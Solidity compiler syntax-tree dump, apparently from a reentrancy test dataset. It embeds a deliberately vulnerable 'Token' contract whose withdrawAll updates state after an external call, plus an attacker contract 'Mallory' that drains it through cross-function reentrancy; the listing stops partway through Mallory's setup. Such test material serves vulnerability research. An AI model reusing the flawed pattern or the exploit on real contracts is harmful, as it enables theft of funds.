Syntax trees:


======= /home/fabric/ArocRevision/Aroc/dataSet/sereum-Reentrancy/cross-function.sol =======
PragmaDirective
   Gas costs: 0
   Source: "pragma solidity ^0.5.0;"
ContractDefinition "Token"
   Source: "contract Token {\r\n\r\n    // This contract keeps track of two balances for it's users. A user can\r\n    // send ether to this contract and exchange ether for tokens and vice\r\n    // versa, given a varying exchange rate (currentRate).\r\n    mapping (address => uint) tokenBalance;\r\n    mapping (address => uint) etherBalance;\r\n    uint currentRate;\r\n\r\n    constructor() public {\r\n    // for solidity 0.4.19\r\n    /*function Token() public {*/\r\n        currentRate = 2;\r\n    }\r\n\r\n    // This contract supports various utility functions for transferring,\r\n    // exchanging Ether and Tokens.\r\n    // Note that this probably makes it rather hard for symbolic execution\r\n    // tools to execute all combinations of possible re-entry points.\r\n    \r\n    function getTokenCountFor(address x) public view returns(uint) {\r\n        return tokenBalance[x];\r\n    }\r\n    function getEtherCountFor(address x) public view returns(uint) {\r\n        return etherBalance[x];\r\n    }\r\n    \r\n    function getTokenCount() public view returns(uint) {\r\n        return tokenBalance[msg.sender];\r\n    }\r\n\r\n    function depositEther() public payable {\r\n        if (msg.value > 0) { etherBalance[msg.sender] += msg.value; }\r\n    }\r\n\r\n    function exchangeTokens(uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = amount * currentRate;\r\n            etherBalance[msg.sender] += etherAmount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }\r\n\r\n    function exchangeEther(uint amount) public payable {\r\n        etherBalance[msg.sender] += msg.value;\r\n        if (etherBalance[msg.sender] >= amount) {\r\n            uint tokenAmount = amount / currentRate;\r\n            etherBalance[msg.sender] -= amount;\r\n            tokenBalance[msg.sender] += tokenAmount;\r\n        }\r\n    }\r\n    function transferToken(address to, uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            tokenBalance[to] += amount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }\r\n    \r\n    // This is the function that will be abused by the attacker during the\r\n    // re-entrancy attack\r\n    function exchangeAndWithdrawToken(uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = tokenBalance[msg.sender] * currentRate;\r\n            tokenBalance[msg.sender] -= amount;\r\n            // safe because it uses the gas-limited transfer function, which\r\n            // does not allow further calls.\r\n            msg.sender.transfer(etherAmount);\r\n        }\r\n    }\r\n\r\n    // Function vulnerable to re-entrancy attack\r\n    function withdrawAll() public {\r\n        uint etherAmount = etherBalance[msg.sender];\r\n        uint tokenAmount = tokenBalance[msg.sender];\r\n        if (etherAmount > 0 && tokenAmount > 0) {\r\n            uint e = etherAmount + (tokenAmount * currentRate);\r\n\r\n            // This state update acts as a re-entrancy guard into this function.\r\n            etherBalance[msg.sender] = 0;\r\n\r\n            // external call. The attacker cannot re-enter withdrawAll, since\r\n            // etherBalance[msg.sender] is already 0.\r\n            msg.sender.call.value(e)(\"\");\r\n\r\n            // problematic state update, after the external call.\r\n            tokenBalance[msg.sender] = 0;\r\n        }\r\n    }\r\n}"
  VariableDeclaration "tokenBalance"
     Type: mapping(address => uint256)
     Gas costs: 0
     Source: "mapping (address => uint) tokenBalance"
    Mapping
       Source: "mapping (address => uint)"
      ElementaryTypeName address
         Source: "address"
      ElementaryTypeName uint
         Source: "uint"
  VariableDeclaration "etherBalance"
     Type: mapping(address => uint256)
     Gas costs: 0
     Source: "mapping (address => uint) etherBalance"
    Mapping
       Source: "mapping (address => uint)"
      ElementaryTypeName address
         Source: "address"
      ElementaryTypeName uint
         Source: "uint"
  VariableDeclaration "currentRate"
     Type: uint256
     Gas costs: 0
     Source: "uint currentRate"
    ElementaryTypeName uint
       Source: "uint"
  FunctionDefinition "" - public
     Source: "constructor() public {\r\n    // for solidity 0.4.19\r\n    /*function Token() public {*/\r\n        currentRate = 2;\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n    // for solidity 0.4.19\r\n    /*function Token() public {*/\r\n        currentRate = 2;\r\n    }"
      ExpressionStatement
         Gas costs: 0
         Source: "currentRate = 2"
        Assignment using operator =
           Type: uint256
           Source: "currentRate = 2"
          Identifier currentRate
             Type: uint256
             Source: "currentRate"
          Literal, token: [no token] value: 2
             Type: int_const 2
             Source: "2"
  FunctionDefinition "getTokenCountFor" - public - const
     Source: "function getTokenCountFor(address x) public view returns(uint) {\r\n        return tokenBalance[x];\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(address x)"
      VariableDeclaration "x"
         Type: address
         Source: "address x"
        ElementaryTypeName address
           Source: "address"
    ParameterList
       Gas costs: 3
       Source: "(uint)"
      VariableDeclaration ""
         Type: uint256
         Source: "uint"
        ElementaryTypeName uint
           Source: "uint"
    Block
       Source: "{\r\n        return tokenBalance[x];\r\n    }"
      Return
         Gas costs: 304
         Source: "return tokenBalance[x]"
        IndexAccess
           Type: uint256
           Source: "tokenBalance[x]"
          Identifier tokenBalance
             Type: mapping(address => uint256)
             Source: "tokenBalance"
          Identifier x
             Type: address
             Source: "x"
  FunctionDefinition "getEtherCountFor" - public - const
     Source: "function getEtherCountFor(address x) public view returns(uint) {\r\n        return etherBalance[x];\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(address x)"
      VariableDeclaration "x"
         Type: address
         Source: "address x"
        ElementaryTypeName address
           Source: "address"
    ParameterList
       Gas costs: 3
       Source: "(uint)"
      VariableDeclaration ""
         Type: uint256
         Source: "uint"
        ElementaryTypeName uint
           Source: "uint"
    Block
       Source: "{\r\n        return etherBalance[x];\r\n    }"
      Return
         Gas costs: 304
         Source: "return etherBalance[x]"
        IndexAccess
           Type: uint256
           Source: "etherBalance[x]"
          Identifier etherBalance
             Type: mapping(address => uint256)
             Source: "etherBalance"
          Identifier x
             Type: address
             Source: "x"
  FunctionDefinition "getTokenCount" - public - const
     Source: "function getTokenCount() public view returns(uint) {\r\n        return tokenBalance[msg.sender];\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 3
       Source: "(uint)"
      VariableDeclaration ""
         Type: uint256
         Source: "uint"
        ElementaryTypeName uint
           Source: "uint"
    Block
       Source: "{\r\n        return tokenBalance[msg.sender];\r\n    }"
      Return
         Gas costs: 303
         Source: "return tokenBalance[msg.sender]"
        IndexAccess
           Type: uint256
           Source: "tokenBalance[msg.sender]"
          Identifier tokenBalance
             Type: mapping(address => uint256)
             Source: "tokenBalance"
          MemberAccess to member sender
             Type: address payable
             Source: "msg.sender"
            Identifier msg
               Type: msg
               Source: "msg"
  FunctionDefinition "depositEther" - public
     Source: "function depositEther() public payable {\r\n        if (msg.value > 0) { etherBalance[msg.sender] += msg.value; }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if (msg.value > 0) { etherBalance[msg.sender] += msg.value; }\r\n    }"
      IfStatement
         Source: "if (msg.value > 0) { etherBalance[msg.sender] += msg.value; }"
        BinaryOperation using operator >
           Type: bool
           Gas costs: 8
           Source: "msg.value > 0"
          MemberAccess to member value
             Type: uint256
             Source: "msg.value"
            Identifier msg
               Type: msg
               Source: "msg"
          Literal, token: [no token] value: 0
             Type: int_const 0
             Source: "0"
        Block
           Source: "{ etherBalance[msg.sender] += msg.value; }"
          ExpressionStatement
             Gas costs: 20327
             Source: "etherBalance[msg.sender] += msg.value"
            Assignment using operator +=
               Type: uint256
               Source: "etherBalance[msg.sender] += msg.value"
              IndexAccess
                 Type: uint256
                 Source: "etherBalance[msg.sender]"
                Identifier etherBalance
                   Type: mapping(address => uint256)
                   Source: "etherBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              MemberAccess to member value
                 Type: uint256
                 Source: "msg.value"
                Identifier msg
                   Type: msg
                   Source: "msg"
  FunctionDefinition "exchangeTokens" - public
     Source: "function exchangeTokens(uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = amount * currentRate;\r\n            etherBalance[msg.sender] += etherAmount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(uint amount)"
      VariableDeclaration "amount"
         Type: uint256
         Source: "uint amount"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = amount * currentRate;\r\n            etherBalance[msg.sender] += etherAmount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }"
      IfStatement
         Source: "if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = amount * currentRate;\r\n            etherBalance[msg.sender] += etherAmount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }"
        BinaryOperation using operator >=
           Type: bool
           Gas costs: 307
           Source: "tokenBalance[msg.sender] >= amount"
          IndexAccess
             Type: uint256
             Source: "tokenBalance[msg.sender]"
            Identifier tokenBalance
               Type: mapping(address => uint256)
               Source: "tokenBalance"
            MemberAccess to member sender
               Type: address payable
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
          Identifier amount
             Type: uint256
             Source: "amount"
        Block
           Source: "{\r\n            uint etherAmount = amount * currentRate;\r\n            etherBalance[msg.sender] += etherAmount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }"
          VariableDeclarationStatement
             Gas costs: 219
             Source: "uint etherAmount = amount * currentRate"
            VariableDeclaration "etherAmount"
               Type: uint256
               Source: "uint etherAmount"
              ElementaryTypeName uint
                 Source: "uint"
            BinaryOperation using operator *
               Type: uint256
               Source: "amount * currentRate"
              Identifier amount
                 Type: uint256
                 Source: "amount"
              Identifier currentRate
                 Type: uint256
                 Source: "currentRate"
          ExpressionStatement
             Gas costs: 20328
             Source: "etherBalance[msg.sender] += etherAmount"
            Assignment using operator +=
               Type: uint256
               Source: "etherBalance[msg.sender] += etherAmount"
              IndexAccess
                 Type: uint256
                 Source: "etherBalance[msg.sender]"
                Identifier etherBalance
                   Type: mapping(address => uint256)
                   Source: "etherBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier etherAmount
                 Type: uint256
                 Source: "etherAmount"
          ExpressionStatement
             Gas costs: 20322
             Source: "tokenBalance[msg.sender] -= amount"
            Assignment using operator -=
               Type: uint256
               Source: "tokenBalance[msg.sender] -= amount"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier amount
                 Type: uint256
                 Source: "amount"
  FunctionDefinition "exchangeEther" - public
     Source: "function exchangeEther(uint amount) public payable {\r\n        etherBalance[msg.sender] += msg.value;\r\n        if (etherBalance[msg.sender] >= amount) {\r\n            uint tokenAmount = amount / currentRate;\r\n            etherBalance[msg.sender] -= amount;\r\n            tokenBalance[msg.sender] += tokenAmount;\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(uint amount)"
      VariableDeclaration "amount"
         Type: uint256
         Source: "uint amount"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        etherBalance[msg.sender] += msg.value;\r\n        if (etherBalance[msg.sender] >= amount) {\r\n            uint tokenAmount = amount / currentRate;\r\n            etherBalance[msg.sender] -= amount;\r\n            tokenBalance[msg.sender] += tokenAmount;\r\n        }\r\n    }"
      ExpressionStatement
         Gas costs: 20327
         Source: "etherBalance[msg.sender] += msg.value"
        Assignment using operator +=
           Type: uint256
           Source: "etherBalance[msg.sender] += msg.value"
          IndexAccess
             Type: uint256
             Source: "etherBalance[msg.sender]"
            Identifier etherBalance
               Type: mapping(address => uint256)
               Source: "etherBalance"
            MemberAccess to member sender
               Type: address payable
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
          MemberAccess to member value
             Type: uint256
             Source: "msg.value"
            Identifier msg
               Type: msg
               Source: "msg"
      IfStatement
         Source: "if (etherBalance[msg.sender] >= amount) {\r\n            uint tokenAmount = amount / currentRate;\r\n            etherBalance[msg.sender] -= amount;\r\n            tokenBalance[msg.sender] += tokenAmount;\r\n        }"
        BinaryOperation using operator >=
           Type: bool
           Gas costs: 301
           Source: "etherBalance[msg.sender] >= amount"
          IndexAccess
             Type: uint256
             Source: "etherBalance[msg.sender]"
            Identifier etherBalance
               Type: mapping(address => uint256)
               Source: "etherBalance"
            MemberAccess to member sender
               Type: address payable
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
          Identifier amount
             Type: uint256
             Source: "amount"
        Block
           Source: "{\r\n            uint tokenAmount = amount / currentRate;\r\n            etherBalance[msg.sender] -= amount;\r\n            tokenBalance[msg.sender] += tokenAmount;\r\n        }"
          VariableDeclarationStatement
             Gas costs: 242
             Source: "uint tokenAmount = amount / currentRate"
            VariableDeclaration "tokenAmount"
               Type: uint256
               Source: "uint tokenAmount"
              ElementaryTypeName uint
                 Source: "uint"
            BinaryOperation using operator /
               Type: uint256
               Source: "amount / currentRate"
              Identifier amount
                 Type: uint256
                 Source: "amount"
              Identifier currentRate
                 Type: uint256
                 Source: "currentRate"
          ExpressionStatement
             Gas costs: 20328
             Source: "etherBalance[msg.sender] -= amount"
            Assignment using operator -=
               Type: uint256
               Source: "etherBalance[msg.sender] -= amount"
              IndexAccess
                 Type: uint256
                 Source: "etherBalance[msg.sender]"
                Identifier etherBalance
                   Type: mapping(address => uint256)
                   Source: "etherBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier amount
                 Type: uint256
                 Source: "amount"
          ExpressionStatement
             Gas costs: 20322
             Source: "tokenBalance[msg.sender] += tokenAmount"
            Assignment using operator +=
               Type: uint256
               Source: "tokenBalance[msg.sender] += tokenAmount"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier tokenAmount
                 Type: uint256
                 Source: "tokenAmount"
  FunctionDefinition "transferToken" - public
     Source: "function transferToken(address to, uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            tokenBalance[to] += amount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(address to, uint amount)"
      VariableDeclaration "to"
         Type: address
         Source: "address to"
        ElementaryTypeName address
           Source: "address"
      VariableDeclaration "amount"
         Type: uint256
         Source: "uint amount"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            tokenBalance[to] += amount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }\r\n    }"
      IfStatement
         Source: "if (tokenBalance[msg.sender] >= amount) {\r\n            tokenBalance[to] += amount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }"
        BinaryOperation using operator >=
           Type: bool
           Gas costs: 307
           Source: "tokenBalance[msg.sender] >= amount"
          IndexAccess
             Type: uint256
             Source: "tokenBalance[msg.sender]"
            Identifier tokenBalance
               Type: mapping(address => uint256)
               Source: "tokenBalance"
            MemberAccess to member sender
               Type: address payable
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
          Identifier amount
             Type: uint256
             Source: "amount"
        Block
           Source: "{\r\n            tokenBalance[to] += amount;\r\n            tokenBalance[msg.sender] -= amount;\r\n        }"
          ExpressionStatement
             Gas costs: 20329
             Source: "tokenBalance[to] += amount"
            Assignment using operator +=
               Type: uint256
               Source: "tokenBalance[to] += amount"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[to]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                Identifier to
                   Type: address
                   Source: "to"
              Identifier amount
                 Type: uint256
                 Source: "amount"
          ExpressionStatement
             Gas costs: 20322
             Source: "tokenBalance[msg.sender] -= amount"
            Assignment using operator -=
               Type: uint256
               Source: "tokenBalance[msg.sender] -= amount"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier amount
                 Type: uint256
                 Source: "amount"
  FunctionDefinition "exchangeAndWithdrawToken" - public
     Source: "function exchangeAndWithdrawToken(uint amount) public {\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = tokenBalance[msg.sender] * currentRate;\r\n            tokenBalance[msg.sender] -= amount;\r\n            // safe because it uses the gas-limited transfer function, which\r\n            // does not allow further calls.\r\n            msg.sender.transfer(etherAmount);\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(uint amount)"
      VariableDeclaration "amount"
         Type: uint256
         Source: "uint amount"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = tokenBalance[msg.sender] * currentRate;\r\n            tokenBalance[msg.sender] -= amount;\r\n            // safe because it uses the gas-limited transfer function, which\r\n            // does not allow further calls.\r\n            msg.sender.transfer(etherAmount);\r\n        }\r\n    }"
      IfStatement
         Source: "if (tokenBalance[msg.sender] >= amount) {\r\n            uint etherAmount = tokenBalance[msg.sender] * currentRate;\r\n            tokenBalance[msg.sender] -= amount;\r\n            // safe because it uses the gas-limited transfer function, which\r\n            // does not allow further calls.\r\n            msg.sender.transfer(etherAmount);\r\n        }"
        BinaryOperation using operator >=
           Type: bool
           Gas costs: 307
           Source: "tokenBalance[msg.sender] >= amount"
          IndexAccess
             Type: uint256
             Source: "tokenBalance[msg.sender]"
            Identifier tokenBalance
               Type: mapping(address => uint256)
               Source: "tokenBalance"
            MemberAccess to member sender
               Type: address payable
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
          Identifier amount
             Type: uint256
             Source: "amount"
        Block
           Source: "{\r\n            uint etherAmount = tokenBalance[msg.sender] * currentRate;\r\n            tokenBalance[msg.sender] -= amount;\r\n            // safe because it uses the gas-limited transfer function, which\r\n            // does not allow further calls.\r\n            msg.sender.transfer(etherAmount);\r\n        }"
          VariableDeclarationStatement
             Gas costs: 514
             Source: "uint etherAmount = tokenBalance[msg.sender] * currentRate"
            VariableDeclaration "etherAmount"
               Type: uint256
               Source: "uint etherAmount"
              ElementaryTypeName uint
                 Source: "uint"
            BinaryOperation using operator *
               Type: uint256
               Source: "tokenBalance[msg.sender] * currentRate"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier currentRate
                 Type: uint256
                 Source: "currentRate"
          ExpressionStatement
             Gas costs: 20322
             Source: "tokenBalance[msg.sender] -= amount"
            Assignment using operator -=
               Type: uint256
               Source: "tokenBalance[msg.sender] -= amount"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier amount
                 Type: uint256
                 Source: "amount"
          ExpressionStatement
             Gas costs: [???]
             Source: "msg.sender.transfer(etherAmount)"
            FunctionCall
               Type: tuple()
               Source: "msg.sender.transfer(etherAmount)"
              MemberAccess to member transfer
                 Type: function (uint256)
                 Source: "msg.sender.transfer"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Identifier etherAmount
                 Type: uint256
                 Source: "etherAmount"
  FunctionDefinition "withdrawAll" - public
     Source: "function withdrawAll() public {\r\n        uint etherAmount = etherBalance[msg.sender];\r\n        uint tokenAmount = tokenBalance[msg.sender];\r\n        if (etherAmount > 0 && tokenAmount > 0) {\r\n            uint e = etherAmount + (tokenAmount * currentRate);\r\n\r\n            // This state update acts as a re-entrancy guard into this function.\r\n            etherBalance[msg.sender] = 0;\r\n\r\n            // external call. The attacker cannot re-enter withdrawAll, since\r\n            // etherBalance[msg.sender] is already 0.\r\n            msg.sender.call.value(e)(\"\");\r\n\r\n            // problematic state update, after the external call.\r\n            tokenBalance[msg.sender] = 0;\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        uint etherAmount = etherBalance[msg.sender];\r\n        uint tokenAmount = tokenBalance[msg.sender];\r\n        if (etherAmount > 0 && tokenAmount > 0) {\r\n            uint e = etherAmount + (tokenAmount * currentRate);\r\n\r\n            // This state update acts as a re-entrancy guard into this function.\r\n            etherBalance[msg.sender] = 0;\r\n\r\n            // external call. The attacker cannot re-enter withdrawAll, since\r\n            // etherBalance[msg.sender] is already 0.\r\n            msg.sender.call.value(e)(\"\");\r\n\r\n            // problematic state update, after the external call.\r\n            tokenBalance[msg.sender] = 0;\r\n        }\r\n    }"
      VariableDeclarationStatement
         Gas costs: 306
         Source: "uint etherAmount = etherBalance[msg.sender]"
        VariableDeclaration "etherAmount"
           Type: uint256
           Source: "uint etherAmount"
          ElementaryTypeName uint
             Source: "uint"
        IndexAccess
           Type: uint256
           Source: "etherBalance[msg.sender]"
          Identifier etherBalance
             Type: mapping(address => uint256)
             Source: "etherBalance"
          MemberAccess to member sender
             Type: address payable
             Source: "msg.sender"
            Identifier msg
               Type: msg
               Source: "msg"
      VariableDeclarationStatement
         Gas costs: 300
         Source: "uint tokenAmount = tokenBalance[msg.sender]"
        VariableDeclaration "tokenAmount"
           Type: uint256
           Source: "uint tokenAmount"
          ElementaryTypeName uint
             Source: "uint"
        IndexAccess
           Type: uint256
           Source: "tokenBalance[msg.sender]"
          Identifier tokenBalance
             Type: mapping(address => uint256)
             Source: "tokenBalance"
          MemberAccess to member sender
             Type: address payable
             Source: "msg.sender"
            Identifier msg
               Type: msg
               Source: "msg"
      IfStatement
         Source: "if (etherAmount > 0 && tokenAmount > 0) {\r\n            uint e = etherAmount + (tokenAmount * currentRate);\r\n\r\n            // This state update acts as a re-entrancy guard into this function.\r\n            etherBalance[msg.sender] = 0;\r\n\r\n            // external call. The attacker cannot re-enter withdrawAll, since\r\n            // etherBalance[msg.sender] is already 0.\r\n            msg.sender.call.value(e)(\"\");\r\n\r\n            // problematic state update, after the external call.\r\n            tokenBalance[msg.sender] = 0;\r\n        }"
        BinaryOperation using operator &&
           Type: bool
           Gas costs: 40
           Source: "etherAmount > 0 && tokenAmount > 0"
          BinaryOperation using operator >
             Type: bool
             Source: "etherAmount > 0"
            Identifier etherAmount
               Type: uint256
               Source: "etherAmount"
            Literal, token: [no token] value: 0
               Type: int_const 0
               Source: "0"
          BinaryOperation using operator >
             Type: bool
             Source: "tokenAmount > 0"
            Identifier tokenAmount
               Type: uint256
               Source: "tokenAmount"
            Literal, token: [no token] value: 0
               Type: int_const 0
               Source: "0"
        Block
           Source: "{\r\n            uint e = etherAmount + (tokenAmount * currentRate);\r\n\r\n            // This state update acts as a re-entrancy guard into this function.\r\n            etherBalance[msg.sender] = 0;\r\n\r\n            // external call. The attacker cannot re-enter withdrawAll, since\r\n            // etherBalance[msg.sender] is already 0.\r\n            msg.sender.call.value(e)(\"\");\r\n\r\n            // problematic state update, after the external call.\r\n            tokenBalance[msg.sender] = 0;\r\n        }"
          VariableDeclarationStatement
             Gas costs: 225
             Source: "uint e = etherAmount + (tokenAmount * currentRate)"
            VariableDeclaration "e"
               Type: uint256
               Source: "uint e"
              ElementaryTypeName uint
                 Source: "uint"
            BinaryOperation using operator +
               Type: uint256
               Source: "etherAmount + (tokenAmount * currentRate)"
              Identifier etherAmount
                 Type: uint256
                 Source: "etherAmount"
              TupleExpression
                 Type: uint256
                 Source: "(tokenAmount * currentRate)"
                BinaryOperation using operator *
                   Type: uint256
                   Source: "tokenAmount * currentRate"
                  Identifier tokenAmount
                     Type: uint256
                     Source: "tokenAmount"
                  Identifier currentRate
                     Type: uint256
                     Source: "currentRate"
          ExpressionStatement
             Gas costs: 5109
             Source: "etherBalance[msg.sender] = 0"
            Assignment using operator =
               Type: uint256
               Source: "etherBalance[msg.sender] = 0"
              IndexAccess
                 Type: uint256
                 Source: "etherBalance[msg.sender]"
                Identifier etherBalance
                   Type: mapping(address => uint256)
                   Source: "etherBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Literal, token: [no token] value: 0
                 Type: int_const 0
                 Source: "0"
          ExpressionStatement
             Gas costs: [???]
             Source: "msg.sender.call.value(e)(\"\")"
            FunctionCall
               Type: tuple(bool,bytes memory)
               Source: "msg.sender.call.value(e)(\"\")"
              FunctionCall
                 Type: function (bytes memory) payable returns (bool,bytes memory)
                 Source: "msg.sender.call.value(e)"
                MemberAccess to member value
                   Type: function (uint256) returns (function (bytes memory) payable returns (bool,bytes memory))
                   Source: "msg.sender.call.value"
                  MemberAccess to member call
                     Type: function (bytes memory) payable returns (bool,bytes memory)
                     Source: "msg.sender.call"
                    MemberAccess to member sender
                       Type: address payable
                       Source: "msg.sender"
                      Identifier msg
                         Type: msg
                         Source: "msg"
                Identifier e
                   Type: uint256
                   Source: "e"
              Literal, token: [no token] value: 
                 Type: literal_string ""
                 Source: "\"\""
          ExpressionStatement
             Gas costs: 5109
             Source: "tokenBalance[msg.sender] = 0"
            Assignment using operator =
               Type: uint256
               Source: "tokenBalance[msg.sender] = 0"
              IndexAccess
                 Type: uint256
                 Source: "tokenBalance[msg.sender]"
                Identifier tokenBalance
                   Type: mapping(address => uint256)
                   Source: "tokenBalance"
                MemberAccess to member sender
                   Type: address payable
                   Source: "msg.sender"
                  Identifier msg
                     Type: msg
                     Source: "msg"
              Literal, token: [no token] value: 0
                 Type: int_const 0
                 Source: "0"
ContractDefinition "Mallory"
   Source: "contract Mallory {\r\n    Token t;\r\n    // this is used to stop the re-entrancy after the second time the Token\r\n    // contract sends Ether to the Mallory contract.\r\n    bool private abort;\r\n    \r\n    constructor(Token _t) public {\r\n    // for solidity 0.4.19\r\n    /*function Mallory(Token _t) public {*/\r\n        t = _t;\r\n        abort = false;\r\n    }\r\n    \r\n    function deposit() public payable {}\r\n    \r\n    function setup() public payable {\r\n        // exchange nearly all available ether to tokens\r\n        uint avail = address(this).balance - 2;\r\n        t.exchangeEther.value(avail)(avail);\r\n        // deposit the last remaining ether\r\n        t.depositEther.value(address(this).balance)();\r\n    }\r\n    \r\n    function attack() public payable {\r\n        // call vulnerable withdrawAll\r\n        t.withdrawAll();\r\n    }\r\n    \r\n    function () external payable {\r\n        if (!abort) {\r\n            // stop the second re-entrancy, which is caused by the transfer\r\n            abort = true;  \r\n            t.exchangeAndWithdrawToken(t.getTokenCount());\r\n        }\r\n    }\r\n}"
  VariableDeclaration "t"
     Type: contract Token
     Gas costs: 0
     Source: "Token t"
    UserDefinedTypeName "Token"
       Source: "Token"
  VariableDeclaration "abort"
     Type: bool
     Gas costs: 0
     Source: "bool private abort"
    ElementaryTypeName bool
       Source: "bool"
  FunctionDefinition "" - public
     Source: "constructor(Token _t) public {\r\n    // for solidity 0.4.19\r\n    /*function Mallory(Token _t) public {*/\r\n        t = _t;\r\n        abort = false;\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(Token _t)"
      VariableDeclaration "_t"
         Type: contract Token
         Source: "Token _t"
        UserDefinedTypeName "Token"
           Source: "Token"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n    // for solidity 0.4.19\r\n    /*function Mallory(Token _t) public {*/\r\n        t = _t;\r\n        abort = false;\r\n    }"
      ExpressionStatement
         Gas costs: 0
         Source: "t = _t"
        Assignment using operator =
           Type: contract Token
           Source: "t = _t"
          Identifier t
             Type: contract Token
             Source: "t"
          Identifier _t
             Type: contract Token
             Source: "_t"
      ExpressionStatement
         Gas costs: 0
         Source: "abort = false"
        Assignment using operator =
           Type: bool
           Source: "abort = false"
          Identifier abort
             Type: bool
             Source: "abort"
          Literal, token: false value: false
             Type: bool
             Source: "false"
  FunctionDefinition "deposit" - public
     Source: "function deposit() public payable {}"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Gas costs: 0
       Source: "{}"
  FunctionDefinition "setup" - public
     Source: "function setup() public payable {\r\n        // exchange nearly all available ether to tokens\r\n        uint avail = address(this).balance - 2;\r\n        t.exchangeEther.value(avail)(avail);\r\n        // deposit the last remaining ether\r\n        t.depositEther.value(address(this).balance)();\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
